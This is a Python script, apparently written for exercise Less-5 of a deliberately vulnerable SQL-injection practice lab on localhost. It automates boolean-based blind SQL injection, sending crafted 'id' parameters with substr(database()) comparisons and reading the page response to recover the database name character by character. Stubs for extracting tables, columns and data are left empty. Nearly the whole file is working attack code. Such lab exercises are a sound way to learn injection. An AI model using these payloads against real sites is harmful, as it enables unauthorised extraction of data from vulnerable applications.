from urllib.parse import unquote
from typing import *

import requests
import re

# Author: HackHuang
# Description: For Less-5
# Last Modified: 2024/12/03 23:15

LAB_ROOT_URL: Final = 'http://localhost:8001'
SQL_COMMENT: Final  = '--+'

def url_decoder(url: str) -> str:
    decoded_url: str = unquote(url)
    return decoded_url

def get_method(url: str, pattern: str) -> bool:
    reponse = requests.get(url=url)
    return True if re.search(pattern=pattern, string=reponse.text) else False

def get_db_name_len(url: str, pattern: str) -> int:
    len: int = 0
    while True:
        url_str: str = LAB_ROOT_URL + url + str(len) + SQL_COMMENT
        print(f'Try to get the db name length ---> {url_str}')
        if get_method(url=url_str, pattern=r'You are in'):
            break
        len = len + 1
    return len

def get_db_name(url: str, pattern: str, db_name_len: int) -> str:
    db_name_ascii_list: List = []
    db_name_char_ascii: int = 97
    left_index = 1
    while len(db_name_ascii_list) < db_name_len:
        url_str: str = LAB_ROOT_URL + url + f"substr(database(), {left_index}, 1)>" + f"'{chr(db_name_char_ascii)}'" + SQL_COMMENT
        print(f'Try to get db name ---> {url_str}')
        if get_method(url=url_str, pattern=pattern):
            db_name_char_ascii = db_name_char_ascii + 1
        else:
            db_name_ascii_list.append(chr(db_name_char_ascii))
            left_index = left_index + 1
            db_name_char_ascii = 97
            print(f'Updated db_name_ascii_list: {db_name_ascii_list}')
    return ''.join(e for e in db_name_ascii_list)

def binary_search() -> str:
    return ''

def get_table_name() -> str:
    return ''

def get_column_name() -> str:
    return ''

def get_data() -> str:
    return ''

# Decoded URL: http://127.0.0.1/sqllib/Less-5/?id=1'and left(database(),1)>'a'--+
# print(f"Decoded URL: {url_decoder("http://127.0.0.1/sqllib/Less-5/?id=1%27and%20left(database(),1)%3E%27a%27--+")}")

# db_name_len: int = get_db_name_len(url="/Less-5/?id=1'and length(database())=")
# print(f'The db name length: {db_name_len}')

db_name: str = get_db_name(url="/Less-5/?id=1' and ", pattern=r'You are in', db_name_len=8)
print(f'The db name: {db_name}')